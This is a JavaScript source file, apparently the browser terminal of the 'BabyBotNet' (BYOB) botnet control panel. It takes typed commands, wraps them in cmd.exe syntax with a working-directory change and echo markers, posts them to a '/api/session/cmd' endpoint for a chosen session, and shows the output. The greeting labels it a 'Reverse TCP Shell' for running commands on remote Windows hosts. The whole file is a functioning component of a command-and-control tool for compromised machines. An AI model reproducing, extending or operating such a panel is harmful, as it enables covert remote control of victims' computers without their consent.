var path = 'C:\\Windows\\system32'
function term_get_prompt() {
  // cmd.exe alike command shell prompt
  return path + '> '
}

jQuery(function ($, undefined) {
  $('#byob_terminal').terminal(
    function (command, term) {
      if (command.length == 0) {
        return
      }
      // construct an actual command to execute
      command =
        path.split('\\')[0] +
        ' & cd "' +
        path +
        '" & ' +
        command +
        ' & echo {{{+ & cd & echo +}}}'

      term.pause()

      try {
        var terminal = this
        //{{ url_for('session.session_cmd') }}
        $.post(
          '/api/session/cmd',
          { session_uid: getParameterByName('session_uid'), cmd: command },
          function (response) {
            try {
              var m = /{{{\+ \r\n(.+)\r\n\+}}}\r\n/g.exec(response)
              if (m != null) {
                path = m[1]
                response = response.split(m[0]).join('')

                // update prompt
                term.set_prompt(term_get_prompt())
              }

              term.set_prompt(term_get_prompt())
              terminal.echo(response)
              term.resume()
            } catch (e) {
              terminal.echo('')
              terminal.echo(response)
            }
          },
        )
      } catch (e) {
        this.error(new String(e))
      }
    },
    {
      greetings:
        'BabyBotNet - Reverse TCP Shell\n[[;#ff0;#000] * Shell is not interactive, please be careful what you execute]\n' +
        '[[;#ff0;#000] * Command execution timeout is set to 30 seconds]\n\n',
      name: 'byob',
      height: 500,
      prompt: term_get_prompt(),
    },
  )
})
